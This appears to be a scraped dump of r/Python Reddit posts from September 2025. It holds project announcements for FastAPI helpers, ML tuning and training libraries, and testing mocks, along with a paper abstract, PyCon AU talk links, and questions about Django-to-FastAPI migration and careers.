1. **New Python Release**: What do you think about the new features in Python 3.11?
2. **Community Events**: Any Python meetups or webinars coming up?
3. **Learning Resources**: Found a great Python tutorial? Share it here!
4. **Job Market**: How has Python impacted your career?
5. **Hot Takes**: Got a controversial Python opinion? Let's hear it!
6. **Community Ideas**: Something you'd like to see us do? tell us.

Let's keep the conversation going. Happy discussing! üåü"
1nqkyzg,Want to use FastAPI with an AI SDK frontend? I built this,doganarif,0,0,2025-09-25 22:43:17,https://www.reddit.com/r/Python/comments/1nqkyzg/want_to_use_fastapi_with_an_ai_sdk_frontend_i/,"Are you trying to wire FastAPI to an AI SDK frontend with streaming? I built a small helper to make that easy.

# What My Project Does

* Connects FastAPI to the AI SDK protocol
* Streams AI responses with SSE
* Uses Pydantic models for typed events
* Simple builders and decorators for a clean API

# Target Audience

* FastAPI devs building chat or streaming AI features
* Teams who want an AI SDK frontend with a Python backend
* Suitable for real apps with tests and MIT license

# Comparison

* Versus rolling your own SSE: less glue, fewer protocol edge cases
* Versus WebSockets: simpler setup, matches the AI SDK stream format
* Versus Node-focused examples: Python first, type validated, FastAPI native

# Links

* GitHub: [https://github.com/doganarif/fastapi-ai-sdk](https://github.com/doganarif/fastapi-ai-sdk)

Happy to hear feedback."
1nqko2g,An Empirical Study of Type-Related Defects in Python Projects [pdf],ketralnis,9,3,2025-09-25 22:30:04,https://www.reddit.com/r/Python/comments/1nqko2g/an_empirical_study_of_typerelated_defects_in/,"https://rebels.cs.uwaterloo.ca/papers/tse2021_khan.pdf

**Abstract**: In recent years, Python has experienced an explosive growth in adoption, particularly among open source projects. While
Python‚Äôs dynamically-typed nature provides developers with powerful programming abstractions, that same dynamic type system
allows for type-related defects to accumulate in code bases. To aid in the early detection of type-related defects, type annotations were
introduced into the Python ecosystem (i.e., PEP-484) and static type checkers like mypy have appeared on the market. While
applying a type checker like mypy can in theory help to catch type-related defects before they impact users, little is known about the
real impact of adopting a type checker to reveal defects in Python projects.
In this paper, we study the extent to which Python projects benefit from such type checking features. For this purpose, we mine the
issue tracking and version control repositories of 210 Python projects on GitHub. Inspired by the work of Gao et al. on type-related
defects in JavaScript, we add type annotations to test whether mypy detects an error that would have helped developers to avoid real
defects. We observe that 15% of the defects could have been prevented by mypy. Moreover, we find that there is no significant
difference between the experience level of developers committing type-related defects and the experience of developers committing
defects that are not type-related. In addition, a manual analysis of the anti-patterns that most commonly lead to type-checking faults
reveals that the redefinition of Python references, dynamic attribute initialization and incorrectly handled Null objects are the most
common causes of type-related faults. Since our study is conducted on fixed public defects that have gone through code reviews and
multiple test cycles, these results represent a lower bound on the benefits of adopting a type checker. Therefore, we recommend
incorporating a static type checker like mypy into the development workflow, as not only will it prevent type-related defects but also
mitigate certain anti-patterns during development"
1nqknrt,AISP - Artificial Immune Systems Package,Jpsilvabarr,13,1,2025-09-25 22:29:42,https://www.reddit.com/r/Python/comments/1nqknrt/aisp_artificial_immune_systems_package/,"Hi everyone!

As part of my final thesis, I developed **AISP (Artificial Immune Systems Package)**, an open-source Python library that implements Artificial Immune System (AIS) techniques.

**What My Project Does**

AISP provides implementations of algorithms inspired by the vertebrate immune system, applicable to tasks such as classification, anomaly detection, and optimization. The package currently includes:

* Negative Selection Algorithm (NSA)
* Clonal Selection Algorithm
* Artificial Immune Network

  
**Target Audience**  
Researchers and students interested in natural computing and machine learning.

  
**Comparison**

Unlike other scattered implementations, AISP brings together multiple Artificial Immune System approaches into a single, unified package with a consistent interface.

üìÇ GitHub: [github.com/AIS-Package/aisp](https://github.com/AIS-Package/aisp)

üìñ Documentation: [ais-package.github.io](https://ais-package.github.io)

üêç Pypi: [https://pypi.org/project/aisp/](https://pypi.org/project/aisp/)"
1nqi7kz,"mockylla, a library that allows you to easily mock out tests based on ScyllaDB",fexx3l,4,2,2025-09-25 20:48:51,https://www.reddit.com/r/Python/comments/1nqi7kz/mockylla_a_library_that_allows_you_to_easily_mock/,"Hey! At [Genlogs](https://www.genlogs.io) we have recently released [mockylla](https://github.com/GenLogs/mockylla), a library that allows you to easily mock tests based on ScyllaDB. We use ScyllaDB in our projects, but when trying to create tests we wanted a simple solution similar to `moto` for AWS, and in our research we didn't find anything that worked for us. That‚Äôs why we created **mockylla**.

## What my project does

**mockylla** is a lightweight, in-memory mock for the ScyllaDB Python driver. It allows you to run integration-style tests for code that depends on ScyllaDB without requiring a live cluster.

It patches the `scylla-driver` at runtime with a single decorator, requiring no changes to your application code.

## Target audience

Any Python developer or company that uses ScyllaDB and needs to write tests more easily and efficiently.

## Comparison

We didn‚Äôt find any existing library that covered this use case, but it is inspired by `moto`, the popular solution for mocking AWS services.
"
1nqfyqh,Looking for Feedback and suggestions: Soundmentations - Library for Audio Augmentation,saumyarr8,5,0,2025-09-25 19:21:44,https://www.reddit.com/r/Python/comments/1nqfyqh/looking_for_feedback_and_suggestions/,"[Soundmentations](https://github.com/saumyarr8/soundmentations)

I am working on this library for sound augmentation. Wanted to know the feedbacks and any features which you would want to see. Currently working on bounding box support (it will have times stamps). The APIs are veryuch similar to Albumentations. Looking forward to your comments."
1nqff8h,[Ajuda] Python ou Go? O que estudar e o que n√£o pode faltar no roadmap,Rude-Priority3611,0,0,2025-09-25 19:01:20,https://www.reddit.com/r/Python/comments/1nqff8h/ajuda_python_ou_go_o_que_estudar_e_o_que_n√£o_pode/,"Ol√° pessoal, tudo bem?

Sou do TI mas agora que estou desempregado, por isso tenho bastante tempo livre para estudar. Quero usar esse tempo para dominar uma linguagem de programa√ß√£o e me tornar um profissional completo. Estou em d√∫vida entre **Python** e **Golang**.

Minha ideia √© focar em:

* Desenvolvimento de APIs
* Qualidade de testes 
* Automa√ß√£o

Al√©m disso, quero consolidar meus conhecimentos em bancos de dados. J√° tenho experi√™ncia em **SQL Server** e um pouco de **MySQL**, mas n√£o conhe√ßo bem **PostgreSQL, Oracle** e outros. Tamb√©m estou estudando ingl√™s para chegar em n√≠vel profissional.

Minhas d√∫vidas:

1. Voc√™s acham que compensa ir direto para **Golang** ou focar em **Python** primeiro?
2. Vale a pena incluir no meu roadmap certifica√ß√µes como **ITIL 4 Foundation, ISO 27001, COBIT 2019, Scrum Fundamentals/Scrum Master, Cloud Fundamentals, Networking basics e Cybersecurity Essentials**?
3. Para organizar os estudos, pensei em usar algum m√©todo como **Scrum/Agile/Kanban**. Voc√™s recomendam o **ClickUp** ou outra ferramenta? Quais dicas dariam para montar essa organiza√ß√£o?

‚ùì **Perguntas principais:**  
O que eu **preciso estudar obrigatoriamente** para me tornar um bom profissional?  
O que **n√£o pode faltar** no meu roadmap de estudos?  
Indicam algum curso especifico ?

Agrade√ßo qualquer sugest√£o!"
1nqe9pj,Series of Jupyter notebooks teaching Jax numerical computing library,iamquah,26,6,2025-09-25 18:17:09,https://www.reddit.com/r/Python/comments/1nqe9pj/series_of_jupyter_notebooks_teaching_jax/,"Two years ago, as part of my Ph.D., I migrated some vectorized NumPy code to JAX to leverage the GPU and achieved a pretty good speedup (roughly 100x, based on how many experiments I could run in the same timeframe). Since third-party resources were quite limited at the time, I spent quite a bit of time time consulting the documentation and experimenting. I ended up creating a series of educational notebooks covering how to migrate from NumPy to JAX, core JAX features (admittedly highly opinionated), and real-world use cases with examples that demonstrate the core features discussed.

The material is designed for self-paced learning, so I thought it might be useful for at least one person here. I've presented it at some events for my university and at [PyCon 2025 - Speed Up Your Code by 50x: A Guide to Moving from NumPy to JAX](https://us.pycon.org/2025/schedule/presentation/54/). 

The repository includes a series of standalone [exercises](https://github.com/IanQS/numpy_to_jax/tree/main/exercises) (with solutions in a separate folder) that introduce each concept with exercises that gradually build on themselves. There's also series of [case-studies](https://github.com/IanQS/numpy_to_jax/tree/main/case_studies) that demonstrate the practical applications with different algorithms.

The core functionality covered includes:

- jit
- loop-primitives
- vmap
- profiling
- gradients + gradient manipulations
- pytrees
- einsum

While the use-cases covers:

- binary classification
- gaussian mixture models
- leaky integrate and fire
- lotka-volterra

---

Plans for the future include 3d-tensor parallelism and maybe more real-world examplees
"
1nqajjt,"Python on the Edge: Fast, sandboxed, and powered by WebAssembly",poopatroopa3,0,6,2025-09-25 15:55:48,https://www.reddit.com/r/Python/comments/1nqajjt/python_on_the_edge_fast_sandboxed_and_powered_by/,"[https://wasmer.io/posts/python-on-the-edge-powered-by-webassembly](https://wasmer.io/posts/python-on-the-edge-powered-by-webassembly)

>With AI workloads on the rise, the demand for Python support on WebAssembly on the Edge has grown rapidly.

>However, bringing Python to WebAssembly isn't trivial as it means supporting native modules like¬†`numpy`,¬†`pandas`, and¬†`pydantic`. While projects like¬†[`pyodide`](https://pyodide.org/en/stable/)¬†made strides in running Python in the browser via WebAssembly, their trade-offs don't fully fit server-side needs.

>After months of hard work, today we're thrilled to announce¬†**full Python support in Wasmer Edge (Beta)**¬†powered by WebAssembly and¬†[WASIX](https://wasix.org/).

>Now you can run¬†**FastAPI, Streamlit, Django, LangChain, MCP servers and more**¬†directly on Wasmer and Wasmer Edge!"
1nq5x1b,PyCon AU 2025 talks are all up!,fphhotchips,27,1,2025-09-25 12:51:06,https://www.reddit.com/r/Python/comments/1nq5x1b/pycon_au_2025_talks_are_all_up/,"This year's PyCon AU talks have all been uploaded! 

They're all in playlist form [here](https://www.youtube.com/playlist?list=PLs4CJRBY5F1LRkAAUwbqHNGPBlxDkrz-3), but in general it's best not to run from start to finish or you'll get a bunch of the conference opening/closing stuff. (Disclaimer: I volunteer for PyCon AU)

This year I'd recommend:

1. [Lilly Ryan's ""Falsehoods Programmers Believe About Reality""](https://www.youtube.com/playlist?list=PLs4CJRBY5F1LRkAAUwbqHNGPBlxDkrz-3) - in which Lilly talks about how to get things done even though it's basically impossible to model the world correctly. 

2. [Benno Rice's ""Skill Issue""](https://www.youtube.com/watch?v=ND_SPnOynvg&list=PLs4CJRBY5F1LRkAAUwbqHNGPBlxDkrz-3&index=65) - in which Benno (of [The Tragedy of Systemd](https://www.youtube.com/watch?v=o_AIw9bGogo)) talks through his discomfort with ~~AI~~ Large Language Models and decides whether he's got valid reasons or if he's simply dislikes change. (Trust me this is not a talk about LLMs... mostly).

3. [Dilpreet Singh's ""Beyond Vibes - Building Evals for Generative AI""](https://youtu.be/sgpPhL15W10?si=KfHxhMNsbfU5lHgT) - Dilpreet talks through the steps he and his team have taken to build  evaluations of LLM outputs. 

I haven't had the chance to watch everything yet, and my time actually in talks was pretty limited this year, so I'm really looking forward to: 

1. [The Student Showcase](https://youtu.be/mqg93zv1S-E?si=ZrTkCcMNTy-2pmZl), [Lightning Talks 1](https://youtu.be/j1e9kF8uaNY?si=FI-g_O8ugvD2dxOk) and [Lightning Talks 2](https://youtu.be/Wl1CZTpWFEk?si=mPXnNDCdQYTcQk4q) - these are all the 'variety' talks that appeal to my attention span. The Student Showcase is almost always my favourite part of the conference, because of how cool the projects are and the fact that _these people are still in high school_.

2. [Hailey Bartlett's ""Pinchy the Bestest Boi""](https://youtu.be/Q2I7uJDIQhE?si=WQ5trjqvwHn8uDCu) - Pinchy robot!

3. [Michaela Wheeler's ""High altitude balloon imagery decoding in the browser with C, JS, and Python""](https://youtu.be/Xd1unoPzvgI?si=EY2zEZ0IZEsbAonT) - I don't know, this just sounds cool?

Keen to hear what others find interesting here! 

(Also, I think I'd be remiss if I didn't mention [PyCon AU 2026](https://2026.pycon.org.au/) has already been announced in Brisbane next year and ticket sales are already open. Worth clicking, ^if ^^only ^^^because ^^^^we ^^^^^animated ^^^^^^the ^^^^^^^Curlyboi ^^^^^^^^this ^^^^^^^^^year)"
1nq45ep,migrating from django to FastAPI,No-Excitement-7974,49,69,2025-09-25 11:25:34,https://www.reddit.com/r/Python/comments/1nq45ep/migrating_from_django_to_fastapi/,"We've hit the scaling wall with our decade-old Django monolith. We handle¬†**45,000 requests/minute (RPM)**¬†across¬†**1,500+ database tables**, and the synchronous¬†**ORM calls**¬†are now our critical bottleneck, even with async views. We need to migrate to an¬†**async-native Python framework**.

To survive this migration, the alternative must meet these criteria:

1. **Python-Based**¬†(for easy code porting).
2. **ORM**¬†support similar to Django,
3. **Stability & Community**¬†(not a niche/beta framework).
4. **Feature Parity:**¬†Must have good equivalents for:
   * **Admin Interface**¬†(crucial for ops).
   * **Template system.**
   * **Signals/Receivers**¬†pattern.
   * **CLI Tools**¬†for¬†**migrations**¬†(`makemigrations`,¬†`migrate`, custom management commands, shell).
5. We're looking at¬†**FastAPI**¬†(great async, but lacks ORM/Admin/Migrations batteries) and¬†**Sanic**, but open to anything.

also please share if you have done this what are your experiences"
1nq3azn,"Best approach to modernize a Python + PyQt5 desktop app (EXE, Windows, offline)?",MatadorFearsNoBull,28,18,2025-09-25 10:38:14,https://www.reddit.com/r/Python/comments/1nq3azn/best_approach_to_modernize_a_python_pyqt5_desktop/,"Hi all,

I have a Python app built with PyQt5 and Qt Creator for the GUI. I need to rebuild and modernize the interface and workflow. My main constraints:

* It must be packaged as an **.exe for Windows** (offline use, no dependencies on a web connection).
* Backend must remain **Python** (lots of logic/data processing already there).
* I‚Äôm fluent in **React** for frontend development, so I‚Äôd love to leverage modern UI practices if possible.

What‚Äôs the best approach in 2025 to create a **modern, polished GUI** for a Python desktop app?

I‚Äôve seen options like Electron (tying React with Python APIs), but it looks easy to get bloated or run into pitfalls. Other people suggest sticking with PyQt or switching to PySide, but they don‚Äôt feel as ‚Äúmodern‚Äù out of the box.

Has anyone here gone through this recently? Should I:

* Stick with PyQt/PySide and just modernize styles?
* Use React with something like Tauri or a bridge to Python?
* Look at other Python-native GUI frameworks?

Would love to hear real-world experience with **long-term maintainability, performance, and packaging into a reliable EXE**."
1nq1588,What small Python automation projects turned out to be the most useful for you?,MENTX3,268,118,2025-09-25 08:19:35,https://www.reddit.com/r/Python/comments/1nq1588/what_small_python_automation_projects_turned_out/,"I‚Äôm trying to level up through practice and I‚Äôm leaning toward automation simple scripts or tools that actually make life or work easier.

What projects have been the most valuable for you? For example:  
 data parsers or scrapers  
 bots (Telegram/Discord)  
 file or document automation  
 small data analysis scripts

I‚Äôm especially curious about projects that solved a real problem for you, not just tutorial exercises.

I think a list like this could be useful not only for me but also for others looking for practical Python project ideas."
1nq0xnm,Please give your input ü§î,MousseBudget6974,0,5,2025-09-25 08:05:31,https://www.reddit.com/r/Python/comments/1nq0xnm/please_give_your_input/,"Hello everyone
I'm currently a QA with Java selenium knowledge. Something's telling me to learn playwright python and move. 

Would be great to have your valuable suggestions"
1nq0n2r,I tried combinning similar youtube comments.,IR-Indigo,1,0,2025-09-25 07:45:55,https://www.reddit.com/r/Python/comments/1nq0n2r/i_tried_combinning_similar_youtube_comments/,"I always wanted to take video (from youtube) with thousands of comments, and combine the similar ones down to just a headline or such.  
Sentences like ""This is amazing"" and ""so amazing"", I think should be condensed.  
**What My Project Does** \- This project aims at taking a single youtube's video's comments and group them up by comment's meaning.

**Comparison:** I thought maybe someone made something like this but no, I can't find anything like it (please share with me if something like this exists).

So I made something: **Youtube Comments Aggregator.**

[You can find it here](https://github.com/Whispergnome/Youtube-Comments-Aggregator/tree/main).

To work the first file, which fetchs comments, you do need a youtube API key. But I've also added a sample .csv file.

**Target Audience**¬†is anyone who read youtube comments.  
What do you think? And can this be improved?"
1npztrj,Typing of functions returns : type hints vs pyright (or similar) inference,Neither_Garage_758,0,16,2025-09-25 06:52:35,https://www.reddit.com/r/Python/comments/1npztrj/typing_of_functions_returns_type_hints_vs_pyright/,"I used to think ""pyright already inferes the return type from what the function does, so no need to repeat it in the type hint.

But recently I realized that writing a return type hint can help to constrain a specification to automatically check if what the functions does follow it.

What do you think ?

It seems the same would apply to Typescript or using \`auto\` as return type in C++."
1nptdms,Helios-ml: A PyTorch based training system,griffin_quill06,10,2,2025-09-25 01:01:04,https://www.reddit.com/r/Python/comments/1nptdms/heliosml_a_pytorch_based_training_system/,"Hello everyone!

I wanted to share the latest release of my AI framework [Helios](https://github.com/marovira/helios-ml)!

# What my Project Does

Helios is a framework designed to make training/testing multiple networks with different configurations easier. In addition, it has a heavy focus on ensuring that training runs can be fully reproduced even in the event of a failure. The main selling points are:

* Makes training different networks with the same code base very easy. For instance, if you have 3 classifiers that you want to train and they all require different combinations of datasets, optimizers, schedulers, etc, then Helios makes it really easy to write all their training code and choose the specific configurations through a config file.
* Full integration with distributed training and `torchrun`.
* Offers systems to ensure reproducibility of training runs even in the event of a crash. This not only saves RNG state by default, but also has a special set of dataset samplers that are also saved. This means that if your training run stops for whatever reason, you can resume and the order in which samples are going to be fed to the network is guaranteed to be the same as if the run hadn't stopped in the first place! Note that reproducibility is only assured as far as PyTorch itself assures reproducibility. So if you use `torch.cudnn.benchmark` then the results won't be fully reproducible, but they should still fall within a reasonable margin.
* Full integration with Optuna for hyper-parameter optimisation. It also supports checkpoints of samplers as well as the ability to restart a study on a specific trial if something goes wrong.

For context: I designed this framework because I've had to deal with regular crashes/restarts on the PCs I use for training networks at work. It got to the point where I would have a PC crash after just minutes of training! As a result, I shopped around for a framework that would guarantee reproducibility out of the box and would allow me to easily configure training runs with a file. Since I couldn't find anything, I wrote one myself. The system has worked pretty well so far and I've used it to train several networks that ended up in our product.

# Target Audience

This is meant to be used mainly for devs in R&D that need to test multiple different networks and/or different configurations within those networks. The reproducibility guarantee makes it easy to to reproduce results.

# Comparison

The design of the framework draws inspiration from [Lightning](https://lightning.ai/) and [BasicSR](https://github.com/XPixelGroup/BasicSR) so I'll compare to those:

* Lightning: Helios is significantly simpler and doesn't support all of the platforms/environments that Lightning does. That said, Helios is significantly easier to use, especially if you need to train different networks and want to reuse the same code. Last I checked, Lightning did not offer any functionality to guarantee reproducibility out of the box, which Helios focuses very heavily on.
* BasicSR: the system for allowing multiple networks to be trained on the same code is similar (I drew inspiration from them) but Helios is much more complete in terms of it's integration with PyTorch as it bundles all optimisers, loss functions, and schedulers out of the box (in addition to a few custom ones). It also has a cleaner API than BasicSR which makes it easier to use (I think). Similar to Lightning, BasicSR offers no functionality to ensure reproducibility, which Helios does provide. They also don't integrate with Optuna natively. 

I hope this project can help someone else in the same way it's helped me. If anyone wants to provide reviews/feedback then I'd be happy to hear it. I'm the only Python dev in my company that works with Python at this level, so I'd welcome feedback from people that know more than me!

Edit: forgot to mention two more differences between the two systems and Helios:
1. Helios natively provides support for training by number of iterations and by number of epochs. Lightning can only train by epochs while BasicSR can only train by iteration. 
1. Helios handles the logic for proper gradient accumulation when training by either epochs or iterations. To my knowledge, neither Lightning nor BasicSR have this functionality."
1nps3nn,"Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",AutoModerator,3,1,2025-09-25 00:00:30,https://www.reddit.com/r/Python/comments/1nps3nn/thursday_daily_thread_python_careers_courses_and/,"# Weekly Thread: Professional Use, Jobs, and Education üè¢

Welcome to this week's discussion on Python in the professional world! This is your spot to talk about job hunting, career growth, and educational resources in Python. Please note, this thread is **not for recruitment**.

---

## How it Works:

1. **Career Talk**: Discuss using Python in your job, or the job market for Python roles.
2. **Education Q&A**: Ask or answer questions about Python courses, certifications, and educational resources.
3. **Workplace Chat**: Share your experiences, challenges, or success stories about using Python professionally.

---

## Guidelines:

- This thread is **not for recruitment**. For job postings, please see r/PythonJobs or the recruitment thread in the sidebar.
- Keep discussions relevant to Python in the professional and educational context.
  
---

## Example Topics:

1. **Career Paths**: What kinds of roles are out there for Python developers?
2. **Certifications**: Are Python certifications worth it?
3. **Course Recommendations**: Any good advanced Python courses to recommend?
4. **Workplace Tools**: What Python libraries are indispensable in your professional work?
5. **Interview Tips**: What types of Python questions are commonly asked in interviews?

---

Let's help each other grow in our careers and education. Happy discussing! üåü"
1nprv1g,ANACONDA ON OLD MAC,Worldly-Guitar-785,0,4,2025-09-24 23:49:15,https://www.reddit.com/r/Python/comments/1nprv1g/anaconda_on_old_mac/,"Hi everybody, I have a pretty old mac (2015) 2,2 GHz Intel Core i7. I have been trying to get Anaconda Jupiter but can't seem to download it. I need it for my python class and the prof keeps asking me to download it on the regular website just like any windows user would do. Please lmk if you have a shortcut for old macs. Thank you!!"
1npq2nz,Durable Vibe Automation Platform for Python Developers,HaimZlatokrilov,0,0,2025-09-24 22:28:52,https://www.reddit.com/r/Python/comments/1npq2nz/durable_vibe_automation_platform_for_python/,"**What My Project Does**

[AutoKitteh](http://www.autokitteh.com) is an¬†[open-source¬†](https://github.com/autokitteh/autokitteh)platform (self-hosted or¬†[SaaS](https://app.autokitteh.cloud/)) that lets you build durable¬†**automations**¬†and¬†**AI agents**¬†from plain English (we call it **VibeAutomation**) 

What you can build?¬†anything from personal to enterprise-grade automations and AI Agents for productivity, DevOps, Ops, ChatOps, human-in-the-loop workflows etc.

Interfaces**:**¬†Web UI, VS-Code / Cursore extension

**Key features**: Vibe automation, Serverless, Connectors to applications¬†(Gmail, Slack, Twilio and many more. Easy to add new applications), Durable workflows¬†- support reliable long-running workflows, Pre-build templates, Workflow visualization.

Links: Serverless cloud [platform](http://app.autokitteh.cloud), GitHub¬†[Repo](https://github.com/autokitteh/autokitteh), Samples¬†[Repo](https://github.com/autokitteh/kittehub), [Discord](https://discord.gg/UhnJuBarZQ)¬†.

**Target Audience**

Anyone with basic Python skills that wants to connect applications and APIs to build automations with or without AI.  
Note that the platform is for connecting APIs and not an application builder like Lovable / Bolt / Base44, however it can be the backend automation for such platforms. 

**Comparison**¬†

Automation tools like:¬†**n8n / Zapier / Make**. Unlike those tools the platform is designed for reliability, long-running workflows, with the flexibility of Python.  
**String** is another platform that goes by the same approach of Vibe automation.

"
1npoyza,Tired of manually timing functions? Meet time-my-func!,ExplanationFit4552,8,11,2025-09-24 21:43:16,https://www.reddit.com/r/Python/comments/1npoyza/tired_of_manually_timing_functions_meet_timemyfunc/,"I built this because‚Ä¶ honestly, I was tired of writing three lines with `time.perf_counter()` just to see how long a function takes. Yes, I‚Äôm that lazy. üòÖ

So I made a tiny Python package that does it for you in **one line**: just slap @timeit() on any function, and it prints the execution time every time the function runs. It even picks the best time unit automatically ‚Äî nanoseconds, microseconds, milliseconds, seconds, or minutes ‚Äî but you can force it if you want.

**What my Project does:**

* **One-line timing:** Just @timeit(). Done.
* **Automatic unit selection:** It figures out whether your function is fast enough for ¬µs or slow enough for seconds.
* **Custom units & precision:** Control decimals or force a specific unit.
* **Works with async functions:** Because sometimes you want to time `async def` too.
* **Exception-friendly:** Even if your function crashes, it still prints the time before propagating the error.

**Usage:**

    from timy_my_func import timeit, set_enabled
    import time
    
    @timeit()
    def fast_function():
        sum(range(100))
    
    @timeit(decimals=5, unit=""ms"")
    def slow_function():
        time.sleep(0.123)
    
    @timeit()
    def disabled_function():
      time.sleep(0.5)
    
    fast_function()
    set_enabled(False)
    disabled_function()
    set_enabled(True)
    slow_function()

**Output:**

    [fast_function] Execution time: 12.345 ¬µs
    [slow_function] Execution time: 123.45678 ms

**Target Audience:**

* Python developers who want **quick, convenient ""benchmarking**"" of functions without boilerplate code.
* Great for **personal projects, experiments, small scripts**, or learning performance optimization.

**Comparison**

* **Manual** `time.perf_counter()`: Flexible, but verbose ‚Äî you need multiple lines for each function, and it‚Äôs easy to forget to start/stop timers.
* **Built-in** `timeit` **module**: Excellent for benchmarking snippets or loops, but awkward for timing full functions inline and printing results each time.
* **Profiling tools (e.g., cProfile, line\_profiler)**: Extremely detailed and powerful, but overkill if you just want a quick execution time. They also require setup and produce more output than most developers want for small tests.
* **Other tiny timing utilities**: Often don‚Äôt support async functions or fail silently if an exception occurs. `timeitdecorator` handles both cleanly and prints results automatically.

It‚Äôs small, it‚Äôs silly, and it‚Äôs way easier than copying and pasting `start = time.perf_counter()`

`print(...)` every time.

Check it out on GitHub: [https://github.com/DeathlyDestiny/function\_timer](https://github.com/DeathlyDestiny/function_timer)

Or just install using pip

    pip install time-my-func"
1nplhop,Teaching my wife python!,Skidkiddo,61,18,2025-09-24 19:26:00,https://www.reddit.com/r/Python/comments/1nplhop/teaching_my_wife_python/,"Hey fellow redditors, I'm teaching my wife python, and I made a lesson plan to both keep me on track and keep her on track and busy. It seems to be working very well. Sharing it here in case its useful to anyone else. [Link](https://github.com/Skidkidd/Teaching_Python)"
1npheag,Python Data Model Exercise,Sea-Ad7805,0,7,2025-09-24 16:50:42,https://www.reddit.com/r/Python/comments/1npheag/python_data_model_exercise/,"An exercise about the Python Data Model. What is the output of this program?

    a = [1]
    b = a
    b += [2]
    b.append(3)
    b = b + [4]
    b.append(5)
    
    print(a)
    # --- possible answers ---
    # A) [1]
    # B) [1, 2]
    # C) [1, 2, 3]
    # D) [1, 2, 3, 4]
    # E) [1, 2, 3, 4, 5]

* [Solution](https://memory-graph.com/#codeurl=https://raw.githubusercontent.com/bterwijn/memory_graph_videos/refs/heads/main/exercises/exercise9.py&play)
* [Explanation](https://github.com/bterwijn/memory_graph?tab=readme-ov-file#python-data-model)
* [More Exercises](https://www.reddit.com/r/Python_memory_graph/)"
1npercr,Fast API better option than Django?,stopwords7,78,53,2025-09-24 15:11:34,https://www.reddit.com/r/Python/comments/1npercr/fast_api_better_option_than_django/,"I have worked with Django since 2017, since its version 1.X, I have more than 10 projects in production from my previous works and I could consider myself an expert in its use, both for monolithic and for using DRF.
I started using Fast API for work in 2022 to create endpoints that required synchronization, fastapi is great for that.

My question is, considering that the learning curve of either of them is not necessary, is FastAPI really a better option than Django for a large project?

Maybe it's because I come from Django, but as apps grow, especially with CRUDs, it's easier to use viewsets than to create each of the endpoints in FastAPI with their functions. 
Something I did for a medium-sized project was to create my own modelviewsets to make CRUDs with classes in FastAPI, but I think that's reinventing the wheel or trying to bring the advantages of Django to FastAPI, I don't think it's the right approach, if I already have it there, why reinvent it?
I don't consider myself a Django fanboy, it has its disadvantages, but I think it has grown a lot with each update, it's already on 6, it has a large community and it is mature. I think its main deficiency is not supporting async natively (it already has some functionalities but is still missing). While FastAPI, I see it more for small projects, applications that require async, such as data processing or AI in general. But for large projects (more than 30-40 endpoints), I think it is more complex to maintain in the long term."
1npb0ks,ConfOpt: Hyperparameter Tuning That Works,RickCodes1200,20,8,2025-09-24 12:38:40,https://www.reddit.com/r/Python/comments/1npb0ks/confopt_hyperparameter_tuning_that_works/,"**What My Project Does:**

I built a new **hyperparameter tuning** package that picks the best hyperparameters for your ML model!

**Target Audience:**

Any Data Scientist who wants to squeeze extra performance out of their hyperparameter tuning.

**How does it work?**

Like Optuna and existing methods, it uses Bayesian Optimization to identify the most promising hyperparameter configurations to try next.

Unlike existing methods though, it makes no distributional assumptions and uses quantile regression to guide next parameter selection.

**Comparison:**

In benchmarking, ConfOpt strongly outperforms Optuna's default sampler (TPE) across the board. If you switch to Optuna's GP sampler, ConfOpt still outperforms, but it's close if you only have numerical hyperparameters. It's still a big outperformance with categorical hyperparameters.

I should also mention this all applies to single fidelity tuning. If you're a pro and you're tuning some massive LLM on multi-fidelity, I don't have benchmarks for you yet.

**Want to learn more?**

For the serious stuff, you can find the preprint of my paper here: [https://www.arxiv.org/abs/2509.17051](https://www.arxiv.org/abs/2509.17051)

If you have any questions or feedback, please let me know in the comments!

**Want to give it a try?** Check out the links below.

* **Github Repository** (consider giving it a star!)**:** [https://github.com/rick12000/confopt](https://github.com/rick12000/confopt)
* **Documentation:** [https://confopt.readthedocs.io/](https://confopt.readthedocs.io/)
* **PyPI:** [https://pypi.org/project/confopt/](https://pypi.org/project/confopt/)

Install it with: `pip install confopt`"
1np9d42,Pyrefly & Instagram - A Case Study on the Pain of Slow Code Navigation,BeamMeUpBiscotti,125,27,2025-09-24 11:15:08,https://www.reddit.com/r/Python/comments/1np9d42/pyrefly_instagram_a_case_study_on_the_pain_of/,"Pyrefly, the new typechecker and language server for Python from Meta, is being battle-tested on Instagram's massive 20M LOC Python codebase. Some of the results have been shared in a new blog post:

> In real world use cases, developers who switched from Pyright (the default LSP for VSCode) to Pyrefly spent 98% less time waiting on hover results and go-to definition was ~10x faster. On the slowest files (p99), these IDE responses grew from an order of minutes to seconds (30x improvement). If those numbers are hard to visualise, the TL;DR is that this upgrade took instagram developers from questioning ‚Äúis my editor frozen?‚Äù to not giving their IDE a second thought.

Full blog post: https://pyrefly.org/blog/2025/09/15/ide-extension/

Disclaimer: I'm one of the maintainers for Pyrefly"
1np8y4w,Need Suggestions,AdministrationFit910,0,12,2025-09-24 10:52:02,https://www.reddit.com/r/Python/comments/1np8y4w/need_suggestions/,"So I'm working as an Automation Engineer in a fintech based company and have total of around 4 years of experience in QA & Automation Engineer

Now I'm stuck at a point in life where in I have a decision to make to plan my future ahead basically either get myself grinding and switch to Dev domain or grind myself and look for SDET kind of roles

I have always been fond of Dev domain but due to family situations I really couldn't try switching from QA to Dev during this period and now I'm pretty sure I'm underpaid to an extent basically I'm earning somewhere between 8-10 lpa even after having 4 years of experience and trust me I'm good at what I do ( it's not me but that's what teammates say)

Please guide me as to what option do you think is feasible for me as consider me I'm the only breadwinner of my family and I genuinely need this community's help to get my mind clear

Thank you so much in advance"
1np8iyh,Made a FastAPI Project Starter,Detox-Boy,21,6,2025-09-24 10:26:35,https://www.reddit.com/r/Python/comments/1np8iyh/made_a_fastapi_project_starter/,"## What My Project Does
I got tired of setting up FastAPI projects from scratch‚Äîdatabases, auth, background tasks, migrations, Docker‚Ä¶ so I built a FastAPI project starter. It scaffolds a production-ready project in seconds, including PostgreSQL (async/sync), Celery+Redis, Loguru logging, Docker, middlewares (RequestID, Timer, CORS), Traefik, and MailPit. Post-deployment hooks start services automatically.

## Target Audience
Backend developers who want to quickly spin up production-ready FastAPI projects, small teams, or solo devs who need a consistent setup across projects.

## Comparison
Compared to starting from scratch or using minimal templates, this starter comes pre-configured with essentials like database, background tasks, logging, Docker, monitoring, and middlewares. Unlike other starters, it has post-deployment hooks and multiple middlewares out of the box, saving setup time and reducing errors.

## Links (for reference)
- GitHub: https://github.com/deveshshrestha20/FastAPI_Project_Starter
